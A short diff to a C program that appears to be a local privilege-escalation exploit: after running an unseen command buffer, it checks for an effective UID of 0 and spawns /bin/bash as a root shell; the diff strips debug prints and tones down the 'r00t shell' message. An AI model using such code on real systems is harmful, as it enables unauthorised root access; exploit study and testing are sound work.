@@ -13,17 +13,11 @@ int main(){
   system(buf);
 
   setuid(12345);
-  uid_t ID;
   uid_t EID;
 
-  ID = getuid();
   EID = geteuid();
-  printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
-  ID = getuid();
-  EID = geteuid();
-  printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
   if (EID == 0){
-    printf("[!!!] Popping r00t shell!!!\n");
+    printf("root shell\n");
     system("/bin/bash");
   }
   return EXIT_SUCCESS;
